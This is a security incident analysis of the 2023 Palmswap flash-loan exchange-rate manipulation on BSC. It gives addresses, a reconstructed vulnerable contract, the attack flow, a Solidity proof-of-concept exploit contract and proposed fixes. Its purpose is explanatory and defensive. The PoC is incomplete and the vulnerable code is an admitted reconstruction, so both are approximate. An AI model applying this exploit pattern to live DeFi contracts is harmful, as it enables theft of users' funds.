# Palmswap Exchange Rate Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Palmswap |
| Date | 2023-07-14 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$900,000 USD |
| Attack Type | Flash Loan + Exchange Rate Manipulation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0xf84efa8a9f7e68855cf17eaac9c2f97a9d131366` |
| Attack Contract | `0x55252a6d50bfad0e5f1009541284c783686f7f25` |
| Vulnerable Contract | `0xd990094a611c3de34664dd3664ebf979a1230fc1` (LiquidityEvent) |
| Attack TX | `0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9` |
| Fork Block | 30,248,637 |

## 2. Vulnerable Code Analysis

Palmswap's `LiquidityEvent` contract allowed exploitation of a temporary imbalance when calculating the exchange rate between USDP and PLP during liquidity additions/removals. Adding and then removing large amounts of liquidity via a flash loan caused a 1:1.9 ratio imbalance.

```solidity
// Vulnerable pattern: ratio calculation in liquidity event
contract LiquidityEvent {
    uint256 public plpPrice;  // Vulnerable: manipulable via liquidity changes

    function purchasePlp(uint256 busdtAmount) external {
        // Mint USDP (1:1)
        uint256 usdpAmount = busdtAmount;
        IVault(vault).buyUSDP(address(BUSDT), busdtAmount);

        // PLP price calculation (manipulable at this point)
        uint256 plpAmount = usdpAmount * 1e18 / plpPrice;
        _mintPLP(msg.sender, plpAmount);
    }

    function unstakeAndRedeemPlp(uint256 plpAmount) external {
        // PLP → BUSDT redemption (applies manipulated ratio)
        uint256 busdtAmount = plpAmount * plpPrice / 1e18;
        BUSDT.transfer(msg.sender, busdtAmount);
    }

    // plpPrice rises 1.9x when large liquidity is removed
    function _updatePlpPrice() internal {
        // Vulnerable: total liquidity changes are immediately reflected in PLP price
        plpPrice = getTotalLiquidity() * 1e18 / totalPLPSupply();
    }
}
```

**Vulnerability**: When large liquidity is added and then partially removed, the PLP price rises artificially, enabling token swaps at the favorable rate of USDP:PLP = 1:1.9.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Exchange Rate Manipulation
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0xf84efa8a9f7e68855cf17eaac9c2f97a9d131366]
  │
  ├─1─▶ RadiantLP.flashLoan() [0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281]
  │      Borrow large amount of BUSDT
  │
  ├─2─▶ LiquidityEvent.purchasePlp() [0xd990094A611c3De34664dd3664ebf979A1230FC1]
  │      BUSDT → USDP (1:1 ratio)
  │      USDP → PLP (normal ratio)
  │
  ├─3─▶ Vault.buyUSDP() [0x806f709558CDBBa39699FBf323C8fDA4e364Ac7A]
  │      Add large liquidity to Vault
  │
  ├─4─▶ LiquidityEvent.unstakeAndRedeemPlp()
  │      Partially remove PLP → plpPrice rises (1 → 1.9)
  │
  ├─5─▶ Convert remaining PLP to USDP at inflated price (1.9x)
  │      [PLP Manager: 0x6876B9804719d8D9F5AEb6ad1322270458fA99E0]
  │
  ├─6─▶ Convert USDP → BUSDT
  │      [fPLP: 0x305496cecCe61491794a4c36D322b42Bb81da9c4]
  │
  └─7─▶ Repay Radiant flash loan + realize ~900K USD profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IVault {
    function buyUSDP(address token, uint256 amount) external returns (uint256);
    function sellUSDP(address token, uint256 amount) external returns (uint256);
}

interface ILiquidityEvent {
    function purchasePlp(uint256 amount) external;
    function unstakeAndRedeemPlp(uint256 plpAmount) external;
}

contract PalmswapExploit {
    IVault vault = IVault(0x806f709558CDBBa39699FBf323C8fDA4e364Ac7A);
    ILiquidityEvent liquidityEvent = ILiquidityEvent(0xd990094A611c3De34664dd3664ebf979A1230FC1);
    IAaveFlashloan radiant = IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 PLP = IERC20(0x8b47515579c39a31871D874a23Fb87517b975eCC);
    IERC20 USDP = IERC20(0x04C7c8476F91D2D6Da5CaDA3B3E17FC4532Fe0cc);

    function testExploit() external {
        // Borrow large amount of BUSDT via Radiant flash loan
        address[] memory assets = new address[](1);
        assets[0] = address(BUSDT);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_000_000e18;
        radiant.flashLoan(address(this), assets, amounts, new uint256[](1), address(this), "", 0);
    }

    function executeOperation(address[] calldata, uint256[] calldata amounts, ...) external returns (bool) {
        // Purchase PLP (BUSDT → PLP, initial 1:1 ratio)
        BUSDT.approve(address(liquidityEvent), amounts[0]);
        liquidityEvent.purchasePlp(amounts[0]);

        uint256 plpBalance = PLP.balanceOf(address(this));

        // Remove partial PLP → plpPrice rises
        liquidityEvent.unstakeAndRedeemPlp(plpBalance / 2);

        // Convert remaining PLP at inflated price (1.9x)
        liquidityEvent.unstakeAndRedeemPlp(PLP.balanceOf(address(this)));

        // Repay flash loan
        BUSDT.approve(address(radiant), amounts[0] * 10009 / 10000);
        return true;
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Exchange rate manipulation, liquidity event design flaw |
| Impact Scope | Entire Palmswap PLP liquidity |
| Explorer | [BSCscan](https://bscscan.com/address/0xd990094a611c3de34664dd3664ebf979a1230fc1) |

## 6. Security Recommendations

```solidity
// Fix 1: Limit large changes during the liquidity event period
uint256 constant MAX_SINGLE_DEPOSIT = 100_000e18; // Single deposit cap

function purchasePlp(uint256 amount) external {
    require(amount <= MAX_SINGLE_DEPOSIT, "Exceeds single deposit limit");
    // ...
}

// Fix 2: Apply TWAP to PLP price
uint256 private _twapPlpPrice;
uint256 private _lastPriceUpdate;

function getPlpPrice() public view returns (uint256) {
    // Minimum 1-hour TWAP (prevents single-block manipulation)
    return _twapPlpPrice;
}

// Fix 3: Prohibit buy and sell within the same block
mapping(address => uint256) public lastPurchaseBlock;

function purchasePlp(uint256 amount) external {
    require(block.number > lastPurchaseBlock[msg.sender], "Cannot purchase and redeem in same block");
    lastPurchaseBlock[msg.sender] = block.number;
    // ...
}

function unstakeAndRedeemPlp(uint256 plpAmount) external {
    require(block.number > lastPurchaseBlock[msg.sender], "Cannot redeem in purchase block");
    // ...
}
```

## 7. Lessons Learned

1. **Liquidity event ratio manipulation**: Architectures where large liquidity additions/removals are immediately reflected in the price are vulnerable to flash loan manipulation. Price updates require delay or averaging.
2. **Same-block trade restriction**: Allowing purchases and sales within the same block enables flash loan-based arbitrage. A minimum holding period of at least one block must be enforced.
3. **Single transaction size limits**: Capping the maximum liquidity that can be processed in a single transaction prevents large-scale manipulation attacks.
4. **BSC perpetual DEX security**: BSC perpetual DEXes such as Palmswap require special attention to the price calculation mechanism for liquidity tokens (PLP).